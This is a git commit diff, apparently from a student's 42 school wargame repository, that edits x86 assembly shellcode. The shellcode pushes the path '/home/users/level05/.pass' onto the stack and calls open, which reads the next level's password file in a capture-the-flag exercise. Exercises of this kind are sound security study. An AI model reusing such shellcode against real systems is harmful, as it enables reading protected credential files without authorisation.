666359d9e3ffd86d9dc4c37603a660dc369faa76
mli42 <mli@student.42.fr>
2022-05-31 00:56:55 +0200

    coucou

--- level04/Ressources/not_execve.asm
+++ level04/Ressources/not_execve.asm
@@ -5,15 +5,17 @@ section .text
 _start:
   xor eax, eax
 
-  push 0x0048
+  push eax
+  push 0x72; "r\0"
+
+  push eax
   push 0x656d6f68
   push 0x6573752f
   push 0x6c2f7372
   push 0x6c657665
   push 0x2e2f3530
-  push 0x73736170
+  push 0x73736170; "/home/users/level05/.pass"
 
   push esp
   mov  al, 0x5
   int  0x80 ; open(&stack, "r")
-
